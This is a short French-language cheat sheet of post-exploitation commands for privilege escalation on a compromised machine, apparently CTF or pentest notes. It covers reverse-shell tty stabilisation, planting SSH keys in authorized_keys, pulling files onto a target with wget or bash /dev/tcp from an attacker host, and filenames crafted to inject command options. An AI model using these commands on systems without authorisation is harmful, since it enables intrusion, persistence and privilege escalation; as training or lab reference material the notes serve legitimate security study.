## Utilitaires

> Commandes et techniques utiles pour réaliser une élévation de privilèges

- **Beautify tty** :

  ```bash
  $ python3 -c 'import pty; pty.spawn("/bin/bash")'
  
  CRTL + z (pour background le process du reverse_shell)
  stty -a | head -n1 
  (regarder les rows et columns)
  
  $ stty raw -echo ; fg;
  $ export TERM=xterm-256color ; stty rows 59 columns 235 ; reset
  ```



- **Générer une paire de clés ssh à copier dans `.ssh/authorized_keys/id_rsa.pub`** :

  ```bash
  $ ssh-keygen -t rsa -b 2048 -f mykey
  ```

  

- **Télécharger des fichiers à partir d'une machine pwned**:

  - *Via python3* :

  ```bash
  # Hôte
  $ cd /directory_you_want_to_dl_from
  $ python3 -m http.server 5655
  
  # Cible
  $ wget http://<host-ip>:5655/<file>
  ```

  - *Via SCP* (donc SSH, besoin d'avoir les identifiants de l'utilisateur courant et un serveur SSH fonctionnel sur l'hôte) :

  ```bash
  # Cible
  $ scp -p <fichier_local> <identifiant_SSH>@<IP>:/tmp/
  ```

  - *S'il n'y a pas wget/curl* :

  ```bash
  # Hôte
  $ nc -lvp 7878 < file
  
  # Cible
  $ bash -c "cat /dev/tcp/<IP>/7878 > file" 
  ```

  

- **Connexion à mysql avec des identifiants** :

  ```bash
  $ mysql -u <user> -p
  ```

  

- **Créer un fichier avec un nom contenant des caractères spéciaux :**

  ```bash
  $ touch -- <name_file_for_example (e.g. --preserve=mode)>
  ```

